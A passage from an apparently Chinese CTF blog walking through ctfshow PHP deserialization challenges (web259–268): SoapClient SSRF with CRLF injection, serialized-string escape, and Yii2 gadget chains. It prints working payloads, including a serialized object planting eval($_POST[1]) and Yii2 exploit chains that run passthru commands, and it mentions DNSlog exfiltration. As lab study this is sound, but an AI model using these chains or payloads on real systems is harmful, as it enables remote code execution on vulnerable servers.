language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize(new ctfShowUser());</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>然后进行rce就行了。</p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>源码</p><p><img src="../images/image-20230104232501397.png" alt="image-20230104232501397"></p><p><img src="../images/image-20230104232508253.png" alt="image-20230104232508253"></p><p>这道题利用的是序列化的ssrf性质</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。必须调用SoapClient不存在的方法，触发SoapClient的<strong>__call魔术方法</strong>。通过CRLF来添加请求体：SoapClinet可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容。</p><p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，采用了SOAP协议（SOAP是一种简单的基于XML的协议，它使应用程序通过HTTP来交换信息），其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会调用__call方法，具体详细信息，感兴趣的读者可以自行查阅，这里不进行赘述</p><p>CRLF是”回车 + 换行”（rn）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS</p><p>在多数CTF题目中，会将这两个知识点结合起来考察。</p><p><strong>首先</strong></p><p><img src="../images/image-20230105181930658.png" alt="image-20230105181930658"></p><p><img src="../images/image-20230105181617490.png" alt="image-20230105181617490"></p><p>我们创建对象的时候设置的参数‘uri’SOAPction，‘location’具体表现在POST和Host。 我们还可以控制参数User-Agent，通过创建对象的时候添加参数’user_agent’=&gt;$u</p><p>Content-Type 和 Content-Length 也是我们可以控制的地方。</p><p><strong>开始伪造http头</strong></p><p><img src="../images/image-20230105182603050.png" alt="image-20230105182603050"></p><p><img src="../images/image-20230105182753522.png" alt="image-20230105182753522"></p><p>成功写入，那么就开始根据题目的要求来写入token.</p><p><img src="../images/image-20230105183131849.png" alt="image-20230105183131849"></p><p>根据题目要求写入的token和X-Forwarded-For</p><p>这里要求的<code>Content-Length:13</code>是因为伪造的http头，只需要执行到token=ctfshow就行。token=ctfshow长度为13.</p><p><img src="../images/image-20230105183531826.png" alt="image-20230105183531826"></p><p>执行成功。</p><p>因为题目的服务器端口是80，所以我们得把9999给去掉。</p><p><img src="../images/image-20230105184013157.png" alt="image-20230105184013157"></p><p><img src="../images/image-20230105184100591.png" alt="image-20230105184100591"></p><p>拿到编码的东西后进行传参。</p><p>然后访问flag.txt就行了。</p><p>这道题主要就是通过ua来构造http头来绕过检测。</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>源码</p><p><img src="../images/image-20230105174655881.png" alt="image-20230105174655881"></p><p>这个点就考察serialize，只要传的之里面有<code>ctfshow_i_love_36D</code>就行了。</p><p><img src="../images/image-20230105174843961.png" alt="image-20230105174843961"></p><p>序列化后的结果。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>源码</p><p><img src="../images/image-20230105175010366.png" alt="image-20230105175010366"></p><p>这里边用的全是魔术方法</p><p>php7.4版本以上的话这里面的话如果有__unserialize()魔术方法的话，会自动绕过 ,wakeup()魔术方法，php5.6版本以下的话，可以通过修改类里边的参数的数量来绕过wakeup方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;   <span class="comment">//对象创建时会自动调用。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//使用unserialize时触发</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123; <span class="comment">//使用serialize时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; <span class="comment">//检查是否存在具有名为 __unserialize() 的魔术方法。此函数将会传递从 __serialize() 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//对象被销毁时触发</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p><img src="../images/image-20230105211617857.png" alt="image-20230105211617857"></p><p>那么这道题的话，只需要用两个魔法函数就行了，这里边的wakeup函数不用管了，因为就是题目的php版本是7.4以上的。invoke()函数也不用管了，因为就是没有触发的点.现在就是看sleep函数了，在serialize时就会触发，给username和password给赋值了。unserialize函数会传递从 __serialize() 返回的恢复数组，那么又会给username和password重新赋值了。因为code这里时弱类型比较，直接877.xxxxxxxx就可以绕过了。</p><p>然后去访问877.php去进行rce就行了。</p><h2 id="web262-字符逃逸"><a href="#web262-字符逃逸" class="headerlink" title="web262(字符逃逸)"></a>web262(字符逃逸)</h2><p>源码</p><p><img src="../images/image-20230105212728740.png" alt="image-20230105212728740"></p><p>先解释一下啥时字符逃逸</p><p><strong>逃逸有一个特征就是对序列化后的字符进行一个替换</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;vip=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$u_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="variable">$us</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$u_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$us</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230105222856799.png" alt="image-20230105222856799"></p><p><strong>这里的话就会出现hacker的长度为5，那么r就逃逸出去了。</strong></p><p>接下来我们想办法把vip变成1.</p><p><img src="../images/image-20230105223446392.png" alt="image-20230105223446392"></p><p>那我们要把vip变成1，且能进行逃逸的话，红线的””内的值要和外面的长度相等就能进行逃逸了。</p><p><img src="../images/image-20230105223548683.png" alt="image-20230105223548683"></p><p>因为我们的payload的长度时45,那么我们就得用45个admin来替换。因为我们的admin和hacker相差一个字符，那么45个字符的话，就可以把上图选中的payload给代替掉，那么我们就可以使其和引号里的值和外面的字符长度一样了   —&gt;  s:2:”xx”   就是类似这种。</p><p><img src="../images/image-20230105224157993.png" alt="image-20230105224157993"></p><p>刚好等于270，逃逸成功，vip也成功写入，当然了就是只看{}里面的内容，超出之后的东西系统不管了。</p><p>讲明白逃逸之后，回到本题。</p><p><img src="../images/image-20230105225632889.png" alt="image-20230105225632889"></p><p>成功逃逸有个字符，那么就跟上面讲解的逃逸的步骤一步一步来就可以解出来了。</p><p><img src="../images/image-20230105225924163.png" alt="image-20230105225924163"></p><p>payload一共有62个字符，那么我们就得去写62个fuck了，这里不知道原因的可以去上面看我写的解释。</p><p><img src="../images/image-20230105230112556.png" alt="image-20230105230112556"></p><p>刚刚好相等，然后进行base64编码后拿去提交。就可以拿到flag了。</p><p><img src="../images/image-20230105230520473.png" alt="image-20230105230520473"></p><p><strong>解法二</strong></p><p><img src="../images/image-20230105230809582.png" alt="image-20230105230809582"></p><p>修改一下token直接就可以进行反序列了。</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>))));</span><br></pre></td></tr></table></figure><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>源码</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>源码</p><p><img src="../images/image-20230106132930372.png" alt="image-20230106132930372"></p><p>message.php</p><p><img src="../images/image-20230106132950692.png" alt="image-20230106132950692"></p><p>这道题还是可以进行字符逃逸，只要进行序列化输出就行了，因为就是在index.php页面的时候已经会将序列化的值进行base64编码了，在message.php页面会只有代码进行base64解码和反序列化。</p><p><img src="../images/image-20230106134745018.png" alt="image-20230106134745018"></p><p><img src="../images/image-20230106134810726.png" alt="image-20230106134810726"></p><p>那么直接进行字符逃逸就行了，这里就不详细写了，因为<strong>web261</strong>已经详细写过了。</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>源码</p><p><img src="../images/image-20230106140404379.png" alt="image-20230106140404379"></p><p>这里因为token是一个md5()随机数，是不可控的，那么可控的只有password，那么我们就得用到&amp;，</p><p><strong>在PHP 中引用的意思是：不同的名字访问同一个变量内容。</strong></p><p>那么我们就可以利用这一点，来使password的值恒等于token的值。</p><p><strong>paylaod</strong></p><p><img src="../images/image-20230106141939242.png" alt="image-20230106141939242"></p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>源码</p><p><img src="../images/image-20230106142948441.png" alt="image-20230106142948441"></p><p>这里面多了个__toString()函数。</p><p>这个函数的作用是如果实例化一个类的话，并将这个对象进行输出的话，就是调用toString函数，没有的话就会报错。</p><p>（如果反序列后的字符串中含有ctfshow的话，将不会进行__destruct()函数的调用。</p><p>因为这里的话，最后的正则判断是不能有ctfshow这个词，但是没有  /i  , 可以利用大写绕过。</p><p><strong>payload</strong></p><p><img src="../images/image-20230106145043122.png" alt="image-20230106145043122"></p><p>为什么可以直接写在post的原因是</p><p><img src="../images/image-20230106145110445.png" alt="image-20230106145110445"></p><p>php://input伪协议的作用。</p><p><strong>解法二</strong></p><p><img src="../images/image-20230106145214649.png" alt="image-20230106145214649"></p><p>类名不变，但是不能正常执行反序列化，因为{}里面的东西不对，那么直接就进行销毁，执行析构函数了。</p><h2 id="web267-yii"><a href="#web267-yii" class="headerlink" title="web267(yii)"></a>web267(yii)</h2><p>源码</p><p><img src="../images/image-20230107205741775.png" alt="image-20230107205741775"></p><p><img src="../images/image-20230107205924759.png" alt="image-20230107205924759"></p><p>登录框架是yii的，那么就可以找一下这个框架的漏洞。</p><p><img src="../images/image-20230107210119947.png" alt="image-20230107210119947"></p><p>利用admin/admin登录成功后，查看about这里的源码，发现这个注释。</p><p><img src="../images/image-20230107210335018.png" alt="image-20230107210335018"></p><p>输入view-source后出现这个。</p><p>然后就找个yii利用链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个链是执行phpinfo()的，可以在__construct函数里边修改执行命令。</p><p><img src="../images/image-20230107210926680.png" alt="image-20230107210926680"></p><p>命令执行成功，说明链表可行。</p><p>然后就修改执行命令</p><p><img src="../images/image-20230107211023372.png" alt="image-20230107211023372"></p><p>这里有个小问题就是system是无回显的，那么可以写马或者利用别的函数来解。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107211300165.png" alt="image-20230107211300165"></p><p>system   可以利用passthru替代。</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943</a>  yii框架漏洞解释</p><p>Yii是一套基于组件、用于开发大型Web应用的高性能PHP框架。<strong>Yii2 2.0.38</strong> 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。</p><p>下次遇到直接拿现成的链来打就好了。</p><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>源码</p><p>和web261一样都是yii漏洞的反序列化链利用。</p><p>显然这道题的话用不了上一题的payload了    ——&gt;  就是把system替换成passthru</p><p>那我们就得换一个方法了</p><p>就是进行写码，那我们得找到当前目录的路径</p><p>(不是/var/www/html)  试过了。</p><p>那么我们就可以利用danslog.cn进行数据外带。</p><p><img src="../images/image-20230107213710478.png" alt="image-20230107213710478"></p><p>在web267中查出来的。</p><p><img src="../images/image-20230107213918120.png" alt="image-20230107213918120"></p><p>解码得到当前文件默认路径。</p><p>exp(以后遇到yii框架的题，可以拿来直接打就行了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span 